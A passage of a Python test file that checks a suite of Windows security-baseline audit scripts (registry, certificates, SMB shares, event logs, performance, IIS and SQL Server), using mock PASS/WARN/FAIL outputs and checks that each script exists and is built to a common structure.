class TestRegistryAudit:
    """Test suite for registry.ps1 audit"""
    
    def test_registry_script_exists(self):
        """Test that registry.ps1 audit script exists"""
        audit_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'registry.ps1'
        )
        assert os.path.exists(audit_path), f"Audit script not found at {audit_path}"
    
    def test_lsa_protection_checks(self):
        """Test LSA protection and credential storage security"""
        mock_output = """
[====] LSA Protection and Credential Storage
[PASS] LSA Protection (RunAsPPL): Enabled (protects against credential theft)
[WARN] Credential Guard: Not enabled (requires UEFI and Hyper-V)
[PASS] WDigest credential caching: Disabled (prevents plaintext password storage)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=800,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 1
        assert 'LSA Protection' in mock_result.stdout
    
    def test_uac_configuration(self):
        """Test User Account Control (UAC) settings"""
        mock_output = """
[====] User Account Control (UAC)
[PASS] UAC: Enabled
[WARN] Admin Approval Mode: Not enabled for built-in admin
[PASS] UAC prompt for admins: Prompt on secure desktop (always)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=600,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 1
        assert 'UAC' in mock_result.stdout
    
    def test_windows_defender_registry(self):
        """Test Windows Defender registry settings"""
        mock_output = """
[====] Windows Defender Registry Settings
[PASS] Defender Real-time Protection: Not disabled by policy
[PASS] Defender Behavior Monitoring: Not disabled
[WARN] Defender Cloud Protection: Disabled (reduces threat detection)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=700,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 1
    
    def test_smb_network_protocols(self):
        """Test SMB and network protocol registry settings"""
        mock_output = """
[====] SMB and Network Protocol Settings
[FAIL] SMBv1: Enabled or not configured (security risk)
[PASS] LLMNR: Disabled (prevents LLMNR poisoning)
[WARN] NetBIOS: Broadcast enabled (consider disabling)
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 1
        assert parsed['fail'] >= 1
        assert 'SMBv1' in mock_result.stdout
    
    def test_powershell_logging(self):
        """Test PowerShell logging and security settings"""
        mock_output = """
[====] PowerShell Logging and Security
[PASS] PowerShell Module Logging: Enabled (tracks module usage)
[PASS] PowerShell Script Block Logging: Enabled (captures script content)
[WARN] PowerShell Transcription: Not enabled (enable for full auditing)
[WARN] PowerShell Execution Policy: RemoteSigned (local scripts unrestricted)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=900,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 2
        assert 'PowerShell' in mock_result.stdout
    
    def test_autorun_autoplay_settings(self):
        """Test AutoRun and AutoPlay registry settings"""
        mock_output = """
[====] AutoRun and AutoPlay Settings
[PASS] AutoRun: Disabled for all drives
[WARN] AutoPlay: Not disabled (security risk)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=400,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 1
        assert parsed['warn'] >= 1


class TestCertificatesAudit:
    """Test suite for certificates.ps1 audit"""
    
    def test_certificates_script_exists(self):
        """Test that certificates.ps1 audit script exists"""
        audit_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'certificates.ps1'
        )
        assert os.path.exists(audit_path), f"Audit script not found at {audit_path}"
    
    def test_certificate_store_inventory(self):
        """Test certificate store inventory"""
        mock_output = """
[====] Certificate Store Inventory
[PASS] LocalMachine\\My store: 5 certificate(s)
[PASS] LocalMachine\\Root store: 342 certificate(s)
[PASS] LocalMachine\\CA store: 28 certificate(s)
[PASS] Total certificates: 425 certificates across all stores
"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=2000,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 4
        assert 'certificate' in mock_result.stdout.lower()
    
    def test_expired_certificates_detection(self):
        """Test detection of expired certificates"""
        mock_output = """
[====] Expired Certificates
[WARN] Expired certificates: 2 expired certificate(s) in Personal stores
  Expired: CN=WebServer01.contoso.com (Expired: 2025-12-15)
  Expired: CN=MailServer.contoso.com (Expired: 2026-01-01)
[WARN] Certificates expiring soon (30 days): 1 certificate(s) expiring soon
  Expires in 15 days: CN=InternalCA
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['warn'] >= 2
        assert 'Expired' in mock_result.stdout
    
    def test_self_signed_certificates(self):
        """Test detection of self-signed certificates"""
        mock_output = """
[====] Self-Signed Certificates
[WARN] Self-signed certificates: 3 self-signed certificate(s) in Personal stores
  Self-signed: CN=localhost
  Self-signed: CN=TestServer
  Self-signed: CN=DevEnvironment
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1200,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['warn'] >= 1
        assert 'Self-signed' in mock_result.stdout
    
    def test_weak_cryptographic_algorithms(self):
        """Test detection of weak cryptographic algorithms"""
        mock_output = """
[====] Weak Cryptographic Algorithms
[FAIL] Certificates with MD5: 1 certificate(s) using insecure MD5
[WARN] Certificates with SHA1: 5 certificate(s) using deprecated SHA1
  SHA1: CN=LegacyApp.contoso.com
  SHA1: CN=OldWebServer
[FAIL] Certificates with weak keys: 2 certificate(s) with key size <2048 bits
  Weak key (1024 bits): CN=VeryOldCert
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=2500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['fail'] >= 2
        assert parsed['warn'] >= 1
        assert 'MD5' in mock_result.stdout or 'SHA1' in mock_result.stdout
    
    def test_root_ca_store_integrity(self):
        """Test root CA store integrity checks"""
        mock_output = """
[====] Root CA Store Integrity
[PASS] Root CA certificates: 342 trusted root CA(s)
[PASS] Expired root CAs: No expired root CAs
[PASS] Self-signed root CAs: All 342 root CAs are self-signed (expected)
"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=1800,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 3
        assert 'Root CA' in mock_result.stdout
    
    def test_certificate_services_detection(self):
        """Test Active Directory Certificate Services (AD CS) detection"""
        mock_output = """
[====] Certificate Services (AD CS)
[PASS] Certificate Services: Running (AD CS installed)
[PASS] CA Configuration: Accessible via certutil
"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert 'Certificate Services' in mock_result.stdout


class TestSharesAudit:
    """Test suite for shares.ps1 audit"""
    
    def test_shares_script_exists(self):
        """Test that shares.ps1 audit script exists"""
        audit_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'shares.ps1'
        )
        assert os.path.exists(audit_path), f"Audit script not found at {audit_path}"
    
    def test_smb_service_status(self):
        """Test SMB service status checks"""
        mock_output = """
[====] SMB Service Status
[PASS] Server (SMB) service: Running
[PASS] Workstation (SMB client) service: Running
"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert 'SMB' in mock_result.stdout
    
    def test_smb_share_enumeration(self):
        """Test SMB share enumeration"""
        mock_output = """
[====] SMB Share Enumeration
[PASS] Total SMB shares: 8 share(s) configured
[PASS] User-created shares: 3 share(s)
"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=800,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert 'share' in mock_result.stdout.lower()
    
    def test_administrative_shares(self):
        """Test administrative shares detection"""
        mock_output = """
[====] Administrative Shares
[PASS] Administrative share ADMIN$: Present
[PASS] Administrative share C$: Present
[PASS] Administrative share IPC$: Present
[PASS] AutoShareWks: Enabled (default for workstations)
[PASS] AutoShareServer: Enabled (default for servers)
"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=600,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 5
        assert 'ADMIN$' in mock_result.stdout or 'C$' in mock_result.stdout
    
    def test_share_permissions_security(self):
        """Test share permissions for security issues"""
        mock_output = """
[====] Share Permissions
[FAIL] Share 'Public' permissions: Everyone has Full Control (security risk)
[WARN] Share 'Data' permissions: Everyone has Change access
[PASS] Share 'Backup' permissions: Authenticated Users: Read
[FAIL] Share 'Temp' permissions: Guest account has access
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=1500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['fail'] >= 2
        assert parsed['warn'] >= 1
        assert parsed['pass'] >= 1
        assert 'Everyone' in mock_result.stdout
    
    def test_smb_protocol_versions(self):
        """Test SMB protocol version configuration"""
        mock_output = """
[====] SMB Protocol Versions
[FAIL] SMBv1 protocol: Enabled (WannaCry/NotPetya vulnerability)
[PASS] SMBv2/v3 protocol: Enabled (recommended)
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=700,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['fail'] >= 1
        assert parsed['pass'] >= 1
        assert 'SMBv1' in mock_result.stdout
    
    def test_smb_signing_configuration(self):
        """Test SMB signing configuration"""
        mock_output = """
[====] SMB Signing Configuration
[PASS] SMB signing (server): Required (prevents man-in-the-middle)
[WARN] SMB signing (client): Enabled but not required (enforce it)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 1
        assert parsed['warn'] >= 1
        assert 'signing' in mock_result.stdout.lower()
    
    def test_smb_encryption(self):
        """Test SMB encryption configuration"""
        mock_output = """
[====] SMB Encryption
[WARN] SMB encryption (global): Not enforced globally (enable per-share or globally)
[PASS] Shares with encryption: 2 share(s) require encryption
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=900,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 1
        assert parsed['warn'] >= 1
        assert 'encryption' in mock_result.stdout.lower()
    
    def test_share_access_auditing(self):
        """Test share access auditing configuration"""
        mock_output = """
[====] Share Access Auditing
[PASS] File share auditing: Success and Failure auditing enabled
[WARN] Access-based enumeration: No shares use ABE (consider enabling)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 1
        assert parsed['warn'] >= 1


class TestWeek3Integration:
    """Integration tests for Week 3 audits"""
    
    def test_all_week3_audits_have_common_structure(self):
        """Test that all Week 3 audits follow common structure"""
        audits = ['disk.ps1', 'scheduled_tasks.ps1', 'registry.ps1', 'certificates.ps1', 'shares.ps1']
        
        for audit_name in audits:
            audit_path = os.path.join(
                os.path.dirname(__file__), 
                '..', '..', 'audits', 'windows', 'platform', 'baseline', audit_name
            )
            
            assert os.path.exists(audit_path), f"Audit {audit_name} not found"
            
            # Read audit script content
            with open(audit_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Verify required components
            assert '#Requires -Version 5.1' in content, f"{audit_name} missing PowerShell version requirement"
            assert '#Requires -RunAsAdministrator' in content, f"{audit_name} missing admin requirement"
            assert 'lib\\common.ps1' in content, f"{audit_name} not sourcing common library"
            assert 'Write-Section' in content, f"{audit_name} not using Write-Section"
            assert 'Register-Check' in content, f"{audit_name} not using Register-Check"
            assert 'Print-Summary' in content, f"{audit_name} not using Print-Summary"
    
    def test_week3_audits_exit_codes(self):
        """Test that Week 3 audits use proper exit codes"""
        # Test PASS scenario (exit 0)
        mock_pass = ExecutionResult(
            exit_code=0,
            stdout="[PASS] All checks passed\n\n=== SUMMARY ===\nTotal: 10 | Pass: 10 | Warn: 0 | Fail: 0",
            stderr="",
            duration_ms=1000,
            protocol="powershell"
        )
        assert mock_pass.exit_code == 0
        
        # Test WARN scenario (exit 1)
        mock_warn = ExecutionResult(
            exit_code=1,
            stdout="[PASS] Check 1\n[WARN] Check 2\n\n=== SUMMARY ===\nTotal: 10 | Pass: 9 | Warn: 1 | Fail: 0",
            stderr="",
            duration_ms=1000,
            protocol="powershell"
        )
        assert mock_warn.exit_code == 1
        
        # Test FAIL scenario (exit 2)
        mock_fail = ExecutionResult(
            exit_code=2,
            stdout="[PASS] Check 1\n[FAIL] Check 2\n\n=== SUMMARY ===\nTotal: 10 | Pass: 8 | Warn: 1 | Fail: 1",
            stderr="",
            duration_ms=1000,
            protocol="powershell"
        )
        assert mock_fail.exit_code == 2
    
    def test_week3_audit_summary_format(self):
        """Test that all Week 3audits produce proper summary format"""
        mock_output = """
[====] Section 1
[PASS] Check 1: Success
[WARN] Check 2: Warning
[FAIL] Check 3: Failure

=== SUMMARY ===
Total Checks: 15
Passed: 10
Warnings: 3
Failed: 2
"""
        parsed = parse_audit_output(mock_output)
        
        # Verify parsed contains required keys
        assert 'pass' in parsed
        assert 'warn' in parsed
        assert 'fail' in parsed
        assert 'checks' in parsed
        assert 'sections' in parsed
        
        # Verify counts match expected values (based on markers in output)
        assert parsed['pass'] >= 1
        assert parsed['warn'] >= 1
        assert parsed['fail'] >= 1
    
    def test_week3_mitre_attack_coverage(self):
        """Test that Week 3 audits cover expected MITRE ATT&CK techniques"""
        # Expected TTPs covered by Week 3
        expected_ttps = {
            'disk.ps1': ['T1486', 'T1083', 'T1005'],
            'scheduled_tasks.ps1': ['T1053.005', 'T1059.001', 'T1218', 'T1087'],
            'registry.ps1': ['T1112', 'T1003.001', 'T1562.001', 'T1547.001'],
            'certificates.ps1': ['T1553.004', 'T1552.004', 'T1598'],
            'shares.ps1': ['T1021.002', 'T1003.002', 'T1210', 'T1557.001']
        }
        
        # Verify we have coverage for each audit
        for audit, ttps in expected_ttps.items():
            assert len(ttps) > 0, f"{audit} should map to MITRE ATT&CK techniques"


# ============================================================================
# WEEK 4 TESTS: OPERATIONAL & APPLICATION SECURITY
# ============================================================================

class TestEventLogsAudit:
    """Tests for eventlogs.ps1 audit script"""
    
    def test_eventlogs_script_exists(self):
        """Verify eventlogs.ps1 audit script exists"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'eventlogs.ps1'
        )
        assert os.path.exists(script_path), f"Event logs audit script not found at {script_path}"
    
    def test_eventlogs_requires_admin(self):
        """Verify eventlogs audit requires administrator privileges"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'eventlogs.ps1'
        )
        
        with open(script_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        assert '#Requires -RunAsAdministrator' in content
        assert 'Test-IsAdminMode' in content
    
    def test_eventlog_service_status(self):
        """Test Event Log service status detection"""
        mock_output = """
[SECTION] Event Log Service Status
[PASS] Event Log service: Running
[PASS] Event Log startup type: Automatic
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        assert 'Event Log service' in str(parsed)
    
    def test_security_log_configuration(self):
        """Test Security log configuration validation"""
        mock_output = """
[SECTION] Security Log Configuration
[PASS] Security log size: 1024.00 MB (adequate for enterprise)
[PASS] Security log retention: Auto-backup enabled
[PASS] Security log enabled: Enabled
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 3
        assert parsed['fail'] == 0
    
    def test_failed_logon_detection(self):
        """Test failed logon attempt detection (Event ID 4625)"""
        mock_output = """
[SECTION] Failed Logon Attempts (Last 24 Hours)
[PASS] Failed logon attempts: 5 failed logons (normal activity)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 1
        
        # Test high failed logons warning
        mock_output_warn = """
[SECTION] Failed Logon Attempts (Last 24 Hours)
[WARN] Failed logon attempts: 25 failed logons (investigate)
[WARN] Failed admin logons: 3 failed attempts on privileged accounts
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 2
    
    def test_account_lockout_events(self):
        """Test account lockout detection (Event ID 4740)"""
        mock_output = """
[SECTION] Account Lockout Events (Last 7 Days)
[PASS] Account lockouts: No account lockouts in last 7 days
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 1
        
        # Test lockout warnings
        mock_output_warn = """
[SECTION] Account Lockout Events (Last 7 Days)
[WARN] Account lockouts: 12 account lockouts (high rate)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1
    
    def test_privilege_escalation_events(self):
        """Test privilege escalation event detection (Event ID 4672)"""
        mock_output = """
[SECTION] Privilege Escalation Events (Last 24 Hours)
[PASS] Privilege escalation events: 15 events in last 24 hours
[PASS] User privilege escalations: 3 user privilege escalations
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
    
    def test_audit_policy_configuration(self):
        """Test audit policy validation via auditpol"""
        mock_output = """
[SECTION] Audit Policy Configuration
[PASS] Audit: Logon: Success and Failure
[PASS] Audit: Credential Validation: Success and Failure
[WARN] Audit: Sensitive Privilege Use: Partial auditing (enable both)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 1
    
    def test_log_clearing_detection(self):
        """Test event log clearing detection (Event ID 1102, 104)"""
        mock_output = """
[SECTION] Event Log Clearing Detection (Last 30 Days)
[PASS] Event log clearing: No log clearing events in last 30 days
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 1
        
        # Test log clearing failure
        mock_output_fail = """
[SECTION] Event Log Clearing Detection (Last 30 Days)
[FAIL] Event log clearing detected: 2 log clearing event(s) (investigate for tampering)
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 1
    
    def test_powershell_script_logging(self):
        """Test PowerShell script block logging detection (Event ID 4104)"""
        mock_output = """
[SECTION] PowerShell Execution Events (Last 24 Hours)
[PASS] PowerShell script executions: 45 script blocks executed
[PASS] Suspicious PowerShell patterns: No suspicious patterns detected
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2


class TestPerformanceAudit:
    """Tests for performance.ps1 audit script"""
    
    def test_performance_script_exists(self):
        """Verify performance.ps1 audit script exists"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'performance.ps1'
        )
        assert os.path.exists(script_path), f"Performance audit script not found at {script_path}"
    
    def test_performance_requires_admin(self):
        """Verify performance audit requires administrator privileges"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'performance.ps1'
        )
        
        with open(script_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        assert '#Requires -RunAsAdministrator' in content
        assert 'Test-IsAdminMode' in content
    
    def test_cpu_utilization_thresholds(self):
        """Test CPU utilization monitoring with thresholds"""
        mock_output = """
[SECTION] CPU Utilization
[PASS] CPU utilization: 35% (normal)
[PASS] Processor queue length: 2 (normal)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test warning threshold
        mock_output_warn = """
[SECTION] CPU Utilization
[WARN] CPU utilization: 80% (high - investigate workload)
[WARN] Processor queue length: 25 (CPU bottleneck detected)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 2
    
    def test_memory_usage_thresholds(self):
        """Test memory usage monitoring with thresholds"""
        mock_output = """
[SECTION] Memory Usage
[PASS] Memory usage: 65.5% used (normal)
[PASS] Available memory: 8.5 GB
[PASS] Page faults: 120/sec
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 3
        
        # Test critical memory
        mock_output_fail = """
[SECTION] Memory Usage
[FAIL] Memory usage: 97.2% used (critical - add more RAM)
[FAIL] Available memory: 0.3 GB (critically low)
[WARN] Page faults: 1200/sec (high - memory pressure)
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 2
    
    def test_disk_io_performance(self):
        """Test disk I/O queue length validation"""
        mock_output = """
[SECTION] Disk I/O Performance
[PASS] Disk C: I/O queue: 2.5
[PASS] Physical disk 0 activity: 35%
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test disk bottleneck
        mock_output_warn = """
[SECTION] Disk I/O Performance
[WARN] Disk C: I/O queue: 15.2 (high - disk bottleneck)
[WARN] Physical disk 0 activity: 92% (very busy)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 2
    
    def test_network_bandwidth_utilization(self):
        """Test network bandwidth utilization calculation"""
        mock_output = """
[SECTION] Network Bandwidth Utilization
[PASS] Ethernet utilization: 15.5% (moderate)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 1
        
        # Test high utilization
        mock_output_warn = """
[SECTION] Network Bandwidth Utilization
[WARN] Ethernet utilization: 85% (high - consider upgrade)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1
    
    def test_process_resource_consumption(self):
        """Test high resource process detection"""
        mock_output = """
[SECTION] Top Resource-Consuming Processes
[PASS] High CPU processes: No processes using excessive CPU
[PASS] High memory processes: No processes using excessive memory
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test excessive resources
        mock_output_warn = """
[SECTION] Top Resource-Consuming Processes
[WARN] High CPU processes: 2 process(es) using >1000 CPU seconds
[WARN] High memory processes: 3 process(es) using >2 GB RAM
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 2
    
    def test_system_uptime_validation(self):
        """Test system uptime monitoring"""
        mock_output = """
[SECTION] System Uptime and Reliability
[PASS] System uptime: 25 days
[PASS] Unexpected reboots: No unexpected reboots
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test long uptime warning
        mock_output_warn = """
[SECTION] System Uptime and Reliability
[WARN] System uptime: 120 days (consider reboot for updates)
[WARN] Unexpected reboots: 2 unexpected reboot(s) in last 7 days
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 2
    
    def test_resource_exhaustion_detection(self):
        """Test resource exhaustion detection"""
        mock_output = """
[SECTION] Resource Exhaustion Detection
[PASS] Low disk space: All volumes have adequate space
[PASS] Memory commit charge: 65%
[PASS] Context switches: 25000/sec
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 3


class TestIISAudit:
    """Tests for iis.ps1 audit script"""
    
    def test_iis_script_exists(self):
        """Verify iis.ps1 audit script exists"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'iis.ps1'
        )
        assert os.path.exists(script_path), f"IIS audit script not found at {script_path}"
    
    def test_iis_requires_admin(self):
        """Verify IIS audit requires administrator privileges"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'iis.ps1'
        )
        
        with open(script_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        assert '#Requires -RunAsAdministrator' in content
        assert 'Test-IsAdminMode' in content
    
    def test_iis_detection_and_skip_logic(self):
        """Test IIS detection and graceful skip when not installed"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'iis.ps1'
        )
        
        with open(script_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Verify skip logic present
        assert 'Get-Service -Name "W3SVC"' in content
        assert 'IIS is not installed' in content
        assert 'exit 0' in content
    
    def test_iis_version_validation(self):
        """Test IIS version detection and validation"""
        mock_output = """
[SECTION] IIS Installation and Version
[PASS] IIS version: Version 10.0 (current)
[PASS] IIS service: Running
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test outdated version
        mock_output_fail = """
[SECTION] IIS Installation and Version
[FAIL] IIS version: Version 7.5 (outdated, upgrade required)
[PASS] IIS service: Running
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 1
    
    def test_application_pool_identity(self):
        """Test application pool identity security validation"""
        mock_output = """
[SECTION] Application Pool Configuration
[PASS] AppPool: DefaultAppPool identity: ApplicationPoolIdentity (least privilege)
[PASS] AppPool: DefaultAppPool runtime: .NET 4.x
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test excessive privileges
        mock_output_fail = """
[SECTION] Application Pool Configuration
[FAIL] AppPool: UnsafePool identity: LocalSystem (excessive privileges)
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 1
    
    def test_ssl_tls_protocol_configuration(self):
        """Test SSL/TLS protocol configuration"""
        mock_output = """
[SECTION] SSL/TLS Configuration
[PASS] TLS 1.2 protocol: Enabled
[PASS] TLS 1.3 protocol: Enabled
[PASS] SSL 3.0 protocol: Disabled
[FAIL] TLS 1.0 protocol: Enabled (should be disabled)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 3
        assert parsed['fail'] >= 1
    
    def test_certificate_expiration_validation(self):
        """Test SSL certificate expiration monitoring"""
        mock_output = """
[SECTION] SSL/TLS Configuration
[PASS] Site: Default Web Site certificate: Valid for 365 days
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 1
        
        # Test expiring certificate
        mock_output_warn = """
[SECTION] SSL/TLS Configuration
[WARN] Site: Default Web Site certificate: Expires in 20 days
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 1
    
    def test_authentication_methods(self):
        """Test IIS authentication method validation"""
        mock_output = """
[SECTION] Authentication Configuration
[PASS] Site: Default Web Site anonymous auth: Disabled
[PASS] Site: Default Web Site basic auth: Disabled
[PASS] Site: Default Web Site Windows auth: Enabled (secure)
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 3
        
        # Test insecure basic auth
        mock_output_fail = """
[SECTION] Authentication Configuration
[FAIL] Site: Default Web Site basic auth: Enabled (sends credentials in clear text)
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 1
    
    def test_security_headers_presence(self):
        """Test HTTP security headers configuration"""
        mock_output = """
[SECTION] HTTP Security Headers
[PASS] Site: Default Web Site X-Frame-Options: Configured (SAMEORIGIN)
[PASS] Site: Default Web Site X-Content-Type-Options: Configured
[PASS] Site: Default Web Site HSTS: Configured
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 3
        
        # Test missing headers
        mock_output_warn = """
[SECTION] HTTP Security Headers
[WARN] Site: Default Web Site X-Frame-Options: Not configured (clickjacking risk)
[WARN] Site: Default Web Site HSTS: Not configured (HTTPS downgrade risk)
"""
        parsed_warn = parse_audit_output(mock_output_warn)
        assert parsed_warn['warn'] >= 2
    
    def test_directory_browsing_disabled(self):
        """Test directory browsing security"""
        mock_output = """
[SECTION] Directory Browsing and Default Documents
[PASS] Site: Default Web Site directory browsing: Disabled
[PASS] Site: Default Web Site default documents: 5 configured
"""
        parsed = parse_audit_output(mock_output)
        assert parsed['pass'] >= 2
        
        # Test enabled directory browsing
        mock_output_fail = """
[SECTION] Directory Browsing and Default Documents
[FAIL] Site: Default Web Site directory browsing: Enabled (information disclosure)
"""
        parsed_fail = parse_audit_output(mock_output_fail)
        assert parsed_fail['fail'] >= 1


class TestSQLServerAudit:
    """Tests for sqlserver.ps1 audit script"""
    
    def test_sqlserver_script_exists(self):
        """Verify sqlserver.ps1 audit script exists"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'sqlserver.ps1'
        )
        assert os.path.exists(script_path), f"SQL Server audit script not found at {script_path}"
    
    def test_sqlserver_requires_admin(self):
        """Verify SQL Server audit requires administrator privileges"""
        script_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'sqlserver.ps1'
        )
        
        with open(script_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        assert '#Requires -RunAsAdministrator' in content
        assert 'Test-IsAdminMode' in content
    
